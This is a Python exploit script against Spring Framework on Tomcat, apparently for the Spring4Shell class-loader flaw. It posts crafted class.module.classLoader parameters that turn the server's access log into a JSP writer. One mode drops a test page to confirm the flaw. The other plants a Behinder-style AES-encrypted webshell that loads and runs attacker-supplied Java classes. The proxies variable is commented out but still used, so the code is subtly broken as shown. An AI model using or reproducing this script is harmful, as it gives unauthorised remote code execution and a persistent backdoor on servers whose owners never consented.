import time
import requests
import random
import argparse


def vuln(url):
    rand = random.randint(10000, 99999)
    content = '<%out.println("6right");%>'.replace("%","%{"+sign+"}i")
    data = {"class.module.classLoader.resources.context.parent.pipeline.first.pattern": content+"<!--",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": suffix,
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": directory,
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": prefix,
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": rand
            }
    requests.post("{}/index".format(url), headers=headers, data=data, proxies=proxies)
    print("wait for 6s...")
    time.sleep(6)
    re2 = requests.get("{}/{}{}.jsp".format(url,prefix,rand))
    if "6right" in re2.text:
        print("inject succ , vuln!")
        print("test is {}/{}{}.jsp".format(url,prefix,rand))
    else:
        print("no vuln!")


def rebeyond(url):
    rand = random.randint(10000, 99999)
    content = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'.replace("%","%{"+sign+"}i")
    data = {"class.module.classLoader.resources.context.parent.pipeline.first.pattern": content+"<!--",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": suffix,
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": directory,
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": prefix,
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": rand
            }
    requests.post("{}/index".format(url), headers=headers, data=data, proxies=proxies)
    print("rebeyond is {}/{}{}.jsp , passwd is rebeyond".format(url,prefix,rand))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Srping Core Rce.')
    parser.add_argument('--url',help='target url',required=True)
    parser.add_argument('--type',help='1 vuln test 2.Behinder shell',required=True,type=int)
    parser.add_argument('--directory',help='target directory',required=False)
    parser.add_argument('--filename',help='target filename',required=False)
#     proxies={
#         "http":"http://127.0.0.1:8080",
#         "https":"https://127.0.0.1:8080",
#     }
    sign = "6right"
    headers = {sign: "%",
               "Content-Type": "application/x-www-form-urlencoded"
    }
    suffix = ".jsp"
    prefix = "inject"
    directory = r"webapps/ROOT"
    args = parser.parse_args()
    if args.filename:
        prefix = args.filename
    if args.directory:
        directory = args.directory
    if args.url and args.type:
        if args.type == 1:
            vuln(args.url)
        elif args.type == 2:
            rebeyond(args.url)
